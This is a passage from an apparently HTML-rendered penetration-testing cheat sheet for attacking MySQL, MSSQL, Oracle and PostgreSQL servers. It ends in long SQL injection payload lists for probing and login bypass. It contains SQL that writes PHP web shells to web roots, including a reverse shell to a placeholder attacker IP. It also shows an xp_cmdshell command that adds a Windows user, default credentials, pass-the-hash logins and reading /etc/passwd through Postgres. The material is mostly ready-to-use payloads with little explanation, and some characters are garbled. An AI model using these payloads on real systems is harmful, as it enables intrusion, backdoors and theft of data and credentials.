mysql <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p password <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;show databases;&#39;</span>
mysql <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p password DBNAME <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;select * from TABLENAME;&#39;</span>
</code></pre></div><h4 id="access-locally">Access Locally:</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p
mysql<span style="color:#f92672">&gt;</span> use DBNAME;
mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> tables;
</code></pre></div><h4 id="command-backdoor-example">Command Backdoor example:</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;/var/www/html/backdoor.php&#34;</span>;
<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;/tmp/shell.php&#34;</span>;
</code></pre></div><h4 id="update-a-field-example-ie-change-a-password">Update a field example: (i.e. change a password):</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">update</span> TABLENAME <span style="color:#66d9ef">set</span> PASSWORDFIELD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NEWHASH&#39;</span> <span style="color:#66d9ef">where</span> USERNAMEFIELD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;USERNAME&#39;</span>;
</code></pre></div><h4 id="phpmyadmin">PHPMyAdmin</h4>
<p>Default User: root<br>
Default Password: (none)<br>
Create a new table, then go to the SQL tab</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;C:\\xampp\\htdocs\\command.php&#34;</span>;<span style="color:#f92672">`</span>
http:<span style="color:#f92672">//</span>TARGTEIP<span style="color:#f92672">/</span>phpmyadmin<span style="color:#f92672">/</span>command.php<span style="color:#f92672">?</span>cmd<span style="color:#f92672">=</span>ipconfig
</code></pre></div><h2 id="mssql-1433">MSSQL-1433</h2>
<p>Default username : sa</p>
<h4 id="nmap-1">Nmap</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span style="color:#ae81ff">1433</span> --script ms-sql-brute --script-args
userdb<span style="color:#f92672">=</span>users.txt,passdb<span style="color:#f92672">=</span>passwords.txt TARGETIP
nmap -p <span style="color:#ae81ff">1433</span> --script ms-sql-xp-cmdshell --script-args
mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>sa,ms-sql-xp-cmdshell.cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;net usertester Tester123! /add&#34;</span> TARGETIP
</code></pre></div><h4 id="sqsh">Sqsh.</h4>
<p><a href="https://sourceforge.net/projects/sqsh/">https://sourceforge.net/projects/sqsh/</a><br>
You can use sqsh to interact with MSSQL databases.<br>
Install the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install freetds
apt-get install sqsh
</code></pre></div><p>Edit /etc/freetds/freetds.conf</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>SERVERNAME<span style="color:#f92672">]</span>
host <span style="color:#f92672">=</span> 10.11.12.13
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1433</span>
tds version <span style="color:#f92672">=</span> 8.0
</code></pre></div><p>Edit .sqshrc<br>
<code>\set style=vert</code><br>
Connect to the database:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqsh -S SERVERNAME -U USER -P PASSWORD
&gt;exec xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>
&gt;go
</code></pre></div><p>Metasploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
</code></pre></div><h4 id="impacket">Impacket.</h4>
<p>Get SQL Shell<br>
<code>mssqlclient.exe quabbles/sqladmin@192.168.3.73 -windows-auth</code><br>
Using proxy<br>
<code>proxychains python mssqlclient.py quabbles/sqladmin@192.168.x.x -windows-auth</code><br>
Run mssql.txt file when authen success (mssql account)<br>
<code>proxychains python mssqlclient.py ./sa:admin@192.168.x.x -file mssql.txt</code><br>
Run mssql.txt file when authen success (win authen)<br>
<code>proxychains python mssqlclient.py -p 1433 quabbles/sqladmin:123456@192.168.x.x -windows-auth -file cpmmand.txt</code><br>
Can using PTH if can<br>
<code>mssqlclient.exe -p 1433 -hashes :&quot;hash&quot; quabbles/sqladmin@192.168.x.x -file command.txt -windows-auth</code><br>
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py</a>
<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
<h2 id="oracle-1521">Oracle-1521</h2>
<h4 id="nmap-2">Nmap:</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span style="color:#ae81ff">1521</span> --script<span style="color:#f92672">=</span>oracle-sid-brute TARGETIP
nmap -sV -Pn -p <span style="color:#ae81ff">1521</span> --script<span style="color:#f92672">=</span>oracle-enum-users --script-args sid<span style="color:#f92672">=</span>ORCL,userdb<span style="color:#f92672">=</span>users.txt TARGETIP
</code></pre></div><h4 id="connect-to-oracle-from-command-line">Connect to Oracle from command line:</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\&gt;</span>sqlplus / as sysdba
<span style="color:#f92672">[</span>will prompt <span style="color:#66d9ef">for</span> password<span style="color:#f92672">]</span>
C:<span style="color:#ae81ff">\&gt;</span>sqlplus
<span style="color:#f92672">[</span>will prompt <span style="color:#66d9ef">for</span> user and password<span style="color:#f92672">]</span>
</code></pre></div><h4 id="oracle-default-accounts">Oracle Default Accounts:</h4>
<p><a href="https://www.orafaq.com/wiki/List_of_default_database_users">https://www.orafaq.com/wiki/List_of_default_database_users</a>
<a href="http://www.petefinnigan.com/default/default_password_list.htm">http://www.petefinnigan.com/default/default_password_list.htm</a><br>
Examples: applsys|apps; ctxsys|ctxsys;dbsnmp|dbsnmp &hellip;</p>
<h2 id="postgressql-5432">PostgresSQL-5432</h2>
<p>Default User: postgres
Default Password: (none)
Local Login:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psql -d DATABASE -U USER
</code></pre></div><p>Remote Login:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psql -h TARGETIP -d DATABASE -U USER
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">select</span> version<span style="color:#f92672">()</span>;	
<span style="color:#66d9ef">select</span> current_database<span style="color:#f92672">()</span>;
<span style="color:#66d9ef">select</span> current_user;
<span style="color:#66d9ef">select</span> session_user;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;log_connections&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;log_statement&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;port&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;password_encryption&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;krb_server_keyfile&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;virtual_host&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;port&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;config_file&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hba_file&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;data_directory&#39;</span><span style="color:#f92672">)</span>;
<span style="color:#66d9ef">select</span> * from pg_shadow;
<span style="color:#66d9ef">select</span> * from pg_group;
create table myfile <span style="color:#f92672">(</span>input TEXT<span style="color:#f92672">)</span>;
copy myfile from <span style="color:#e6db74">&#39;/etc/passwd&#39;</span>; 
<span style="color:#66d9ef">select</span> * from myfile;copy myfile to /tmp/test;
</code></pre></div><h1 id="sql-injection">SQL Injection</h1>
<h3 id="bad-character-detect">Bad character detect</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">&#39;&#39;
</span><span style="color:#e6db74">`
</span><span style="color:#e6db74">``
</span><span style="color:#e6db74">,
</span><span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">&#34;&#34;
</span><span style="color:#e6db74">/
</span><span style="color:#e6db74">//
</span><span style="color:#e6db74">\
</span><span style="color:#e6db74">\\
</span><span style="color:#e6db74">;
</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">-- or # 
</span><span style="color:#e6db74">&#39; OR &#39;1
</span><span style="color:#e6db74">&#39; OR 1 -- -
</span><span style="color:#e6db74">&#34;</span> OR <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">&#34;</span> OR 1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> -- -
<span style="color:#e6db74">&#39; OR &#39;&#39; = &#39;</span>
<span style="color:#e6db74">&#39;=&#39;</span>
<span style="color:#e6db74">&#39;LIKE&#39;</span>
<span style="color:#e6db74">&#39;=0--+
</span><span style="color:#e6db74"> OR 1=1
</span><span style="color:#e6db74">&#39;</span> OR <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x
</span><span style="color:#e6db74">&#39;</span> AND id IS NULL; --
<span style="color:#e6db74">&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;</span><span style="color:#ae81ff">2</span>
%00
/*â€¦*/ 
+
<span style="color:#f92672">||</span>
%
AND <span style="color:#ae81ff">1</span>
AND <span style="color:#ae81ff">0</span>
AND true
AND false
1-false
1-true
1*56
-2
1<span style="color:#e6db74">&#39; ORDER BY 1--+
</span><span style="color:#e6db74">1&#39;</span> ORDER BY 2--+
1<span style="color:#e6db74">&#39; ORDER BY 3--+
</span><span style="color:#e6db74">1&#39;</span> ORDER BY 1,2--+
1<span style="color:#e6db74">&#39; ORDER BY 1,2,3--+
</span><span style="color:#e6db74">1&#39;</span> GROUP BY 1,2,--+
1<span style="color:#e6db74">&#39; GROUP BY 1,2,3--+
</span><span style="color:#e6db74">&#39;</span> GROUP BY columnnames having 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -- - 
-1<span style="color:#e6db74">&#39; UNION SELECT 1,2,3--+
</span><span style="color:#e6db74">&#39;</span> UNION SELECT sum<span style="color:#f92672">(</span>columnname <span style="color:#f92672">)</span> from tablename -- - 
-1 UNION SELECT <span style="color:#ae81ff">1</span> INTO @,@
-1 UNION SELECT <span style="color:#ae81ff">1</span> INTO @,@,@
<span style="color:#ae81ff">1</span> AND <span style="color:#f92672">(</span>SELECT * FROM Users<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 1	
<span style="color:#e6db74">&#39; AND MID(VERSION(),1,1) = &#39;</span>5<span style="color:#e6db74">&#39;;
</span><span style="color:#e6db74">&#39;</span> and <span style="color:#ae81ff">1</span> in <span style="color:#f92672">(</span><span style="color:#66d9ef">select</span> min<span style="color:#f92672">(</span>name<span style="color:#f92672">)</span> from sysobjects where xtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;U&#39;</span> and name &gt; <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">)</span> --
,<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span> * from <span style="color:#f92672">(</span><span style="color:#66d9ef">select</span><span style="color:#f92672">(</span>sleep<span style="color:#f92672">(</span>10<span style="color:#f92672">)))</span>a<span style="color:#f92672">)</span>
%2c<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span>%20*%20from%20<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span><span style="color:#f92672">(</span>sleep<span style="color:#f92672">(</span>10<span style="color:#f92672">)))</span>a<span style="color:#f92672">)</span>
<span style="color:#e6db74">&#39;;WAITFOR DELAY &#39;</span>0:0:30<span style="color:#e6db74">&#39;--
</span><span style="color:#e6db74">#
</span><span style="color:#e6db74">/*
</span><span style="color:#e6db74">-- -
</span><span style="color:#e6db74">;%00
</span><span style="color:#e6db74">`
</span><span style="color:#e6db74">/?q=1
</span><span style="color:#e6db74">/?q=1&#39;</span>
/?q<span style="color:#f92672">=</span>1<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">/?q=[1]
</span><span style="color:#e6db74">/?q[]=1
</span><span style="color:#e6db74">/?q=1`
</span><span style="color:#e6db74">/?q=1\
</span><span style="color:#e6db74">/?q=1/*&#39;*/
</span><span style="color:#e6db74">/?q=1/*!1111&#39;*/
</span><span style="color:#e6db74">/?q=1&#39;||&#39;asd&#39;||&#39;
</span><span style="color:#e6db74">/?q=1&#39; or &#39;1&#39;=&#39;1
</span><span style="color:#e6db74">/?q=1 or 1=1
</span><span style="color:#e6db74">/?q=&#39;or&#39;&#39;=&#39;
</span></code></pre></div><h3 id="authen-bypass">Authen bypass</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;-&#39;</span>
<span style="color:#e6db74">&#39; &#39;</span>
<span style="color:#e6db74">&#39;&amp;&#39;</span>
<span style="color:#e6db74">&#39;^&#39;</span>
<span style="color:#e6db74">&#39;*&#39;</span>
<span style="color:#e6db74">&#39; or &#39;&#39;-&#39;</span>
<span style="color:#e6db74">&#39; or &#39;&#39; &#39;</span>
<span style="color:#e6db74">&#39; or &#39;&#39;&amp;&#39;</span>
<span style="color:#e6db74">&#39; or &#39;&#39;^&#39;</span>
<span style="color:#e6db74">&#39; or &#39;&#39;*&#39;</span>
<span style="color:#e6db74">&#34;-&#34;</span>
<span style="color:#e6db74">&#34; &#34;</span>
<span style="color:#e6db74">&#34;&amp;&#34;</span>
<span style="color:#e6db74">&#34;^&#34;</span>
<span style="color:#e6db74">&#34;*&#34;</span>
<span style="color:#e6db74">&#34; or &#34;&#34;-&#34;</span>
<span style="color:#e6db74">&#34; or &#34;&#34; &#34;</span>
<span style="color:#e6db74">&#34; or &#34;&#34;&amp;&#34;</span>
<span style="color:#e6db74">&#34; or &#34;&#34;^&#34;</span>
<span style="color:#e6db74">&#34; or &#34;&#34;*&#34;</span>
or true--
<span style="color:#e6db74">&#34; or true--
</span><span style="color:#e6db74">&#39; or true--
</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span> or true--
<span style="color:#e6db74">&#39;) or true--
</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">)=(</span><span style="color:#e6db74">&#39;x
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">))</span> or <span style="color:#f92672">((</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">))=((</span><span style="color:#e6db74">&#39;x
</span><span style="color:#e6db74">&#34; or &#34;x&#34;=&#34;x
</span><span style="color:#e6db74">&#34;) or (&#34;x&#34;)=(&#34;x
</span><span style="color:#e6db74">&#34;)) or ((&#34;x&#34;))=((&#34;x
</span><span style="color:#e6db74">or 1=1
</span><span style="color:#e6db74">or 1=1--
</span><span style="color:#e6db74">or 1=1#
</span><span style="color:#e6db74">or 1=1/*
</span><span style="color:#e6db74">admin&#39;</span> --
admin<span style="color:#e6db74">&#39; #
</span><span style="color:#e6db74">admin&#39;</span>/*
admin<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
admin<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;--
</span><span style="color:#e6db74">admin&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
admin<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
</span><span style="color:#e6db74">admin&#39;</span>or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> or <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">admin&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
admin<span style="color:#e6db74">&#39; or 1=1--
</span><span style="color:#e6db74">admin&#39;</span> or 1<span style="color:#f92672">=</span>1#
admin<span style="color:#e6db74">&#39; or 1=1/*
</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>--
admin<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;#
</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>/*
admin<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
admin<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;--
</span><span style="color:#e6db74">admin&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
admin<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
</span><span style="color:#e6db74">1234 &#39;</span> AND 1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> UNION ALL SELECT <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;81dc9bdb52d04dc20036dbd8313ed055
</span><span style="color:#e6db74">admin&#34; --
</span><span style="color:#e6db74">admin&#34; #
</span><span style="color:#e6db74">admin&#34;/*
</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1
</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1&#34;--
</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1&#34;#
</span><span style="color:#e6db74">admin&#34; or &#34;1&#34;=&#34;1&#34;/*
</span><span style="color:#e6db74">admin&#34;or 1=1 or &#34;&#34;=&#34;
</span><span style="color:#e6db74">admin&#34; or 1=1
</span><span style="color:#e6db74">admin&#34; or 1=1--
</span><span style="color:#e6db74">admin&#34; or 1=1#
</span><span style="color:#e6db74">admin&#34; or 1=1/*
</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1
</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1&#34;--
</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1&#34;#
</span><span style="color:#e6db74">admin&#34;) or (&#34;1&#34;=&#34;1&#34;/*
</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1
</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1&#34;--
</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1&#34;#
</span><span style="color:#e6db74">admin&#34;) or &#34;1&#34;=&#34;1&#34;/*
</span><span style="color:#e6db74">1234 &#34; AND 1=0 UNION ALL SELECT &#34;admin&#34;, &#34;81dc9bdb52d04dc20036dbd8313ed055
</span><span style="color:#e6db74">==
</span><span style="color:#e6db74">=
</span><span style="color:#e6db74">&#39;</span>
<span style="color:#e6db74">&#39; --
</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#</span>
<span style="color:#e6db74">&#39; â€“
</span><span style="color:#e6db74">&#39;</span>--
<span style="color:#e6db74">&#39;/*
</span><span style="color:#e6db74">&#39;</span><span style="color:#75715e">#</span>
<span style="color:#e6db74">&#34; --
</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#</span>
<span style="color:#e6db74">&#34;/*
</span><span style="color:#e6db74">&#39; and 1=&#39;1
</span><span style="color:#e6db74">&#39; and a=&#39;a
</span><span style="color:#e6db74"> or 1=1
</span><span style="color:#e6db74"> or true
</span><span style="color:#e6db74">&#39; or &#39;&#39;=&#39;
</span><span style="color:#e6db74">&#34;</span> or <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">1â€²) and &#39;1â€²=&#39;1â€“
</span><span style="color:#e6db74">&#39; AND 1=0 UNION ALL SELECT &#39;&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
</span><span style="color:#e6db74">&#34;</span> AND 1<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> UNION ALL SELECT <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;81dc9bdb52d04dc20036dbd8313ed055
</span><span style="color:#e6db74"> and 1=1
</span><span style="color:#e6db74"> and 1=1â€“
</span><span style="color:#e6db74">&#39; and &#39;one&#39;=&#39;one
</span><span style="color:#e6db74">&#39; and &#39;one&#39;=&#39;oneâ€“
</span><span style="color:#e6db74">&#39; group by password having 1=1--
</span><span style="color:#e6db74">&#39; group by userid having 1=1--
</span><span style="color:#e6db74">&#39; group by username having 1=1--
</span><span style="color:#e6db74"> like &#39;%&#39;
</span><span style="color:#e6db74"> or 0=0 --
</span><span style="color:#e6db74"> or 0=0 #
</span><span style="color:#e6db74"> or 0=0 â€“
</span><span style="color:#e6db74">&#39; or         0=0 #
</span><span style="color:#e6db74">&#39; or 0=0 --
</span><span style="color:#e6db74">&#39; or 0=0 #
</span><span style="color:#e6db74">&#39; or 0=0 â€“
</span><span style="color:#e6db74">&#34;</span> or 0<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> --
<span style="color:#e6db74">&#34; or 0=0 #
</span><span style="color:#e6db74">&#34;</span> or 0<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> â€“
%<span style="color:#e6db74">&#39; or &#39;</span>0<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">0</span>
 or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 or 1<span style="color:#f92672">=</span>1--
 or 1<span style="color:#f92672">=</span>1/*
 or 1<span style="color:#f92672">=</span>1#
 or 1<span style="color:#f92672">=</span>1â€“
<span style="color:#e6db74">&#39; or 1=1--
</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>--
<span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
<span style="color:#e6db74">&#39; or &#39;</span>1â€²<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
<span style="color:#e6db74">&#39; or 1=1 --
</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> â€“
<span style="color:#e6db74">&#39; or 1=1--
</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span>1;<span style="color:#75715e">#</span>
<span style="color:#e6db74">&#39; or 1=1/*
</span><span style="color:#e6db74">&#39;</span> or 1<span style="color:#f92672">=</span>1#
<span style="color:#e6db74">&#39; or 1=1â€“
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1--
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>--
<span style="color:#e6db74">&#39;) or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;/*
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">#</span>
<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1--
<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;--
</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">)</span> or <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>/*
<span style="color:#e6db74">&#39;) or (&#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#e6db74">&#39;#
</span><span style="color:#e6db74">&#39;</span>or<span style="color:#e6db74">&#39;1=1
</span><span style="color:#e6db74">&#39;</span>or<span style="color:#e6db74">&#39;1=1â€²
</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1
</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1&#34;--
</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1&#34;/*
</span><span style="color:#e6db74">&#34; or &#34;1&#34;=&#34;1&#34;#
</span><span style="color:#e6db74">&#34; or 1=1
</span><span style="color:#e6db74">&#34; or 1=1 --
</span><span style="color:#e6db74">&#34; or 1=1 â€“
